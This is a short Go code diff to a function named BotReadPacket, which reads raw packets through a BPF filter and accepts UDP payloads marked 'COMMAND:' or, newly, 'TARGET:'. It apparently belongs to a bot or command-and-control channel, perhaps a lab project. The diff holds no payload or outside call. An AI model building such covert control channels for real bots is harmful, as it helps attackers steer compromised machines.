@@ -105,7 +105,7 @@ func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 // vm 	--> BPF VM that contains the BPF Program
 //
 // Returns 	--> None
-func BotReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
+func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 
 	// Buffer for packet data that is read in
 	buf := make([]byte, 1500)
@@ -125,7 +125,7 @@ func BotReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	checkEr(err)
 	if numBytes == 0 {
 		// Change "continue" to return for routine logic
-		return nil // 0 means that the packet should be dropped
+		return nil, false // 0 means that the packet should be dropped
 		// Here we are just "ignoring" the packet and moving on to the next one
 	}
 
@@ -134,11 +134,13 @@ func BotReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Make sure this is my packet
 		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
-			return packet
+			return packet, false
+		} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
+			return packet, true
 		}
-		return nil
+		return nil, false
 	}
-	return nil
+	return nil, false
 }
 
 // CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
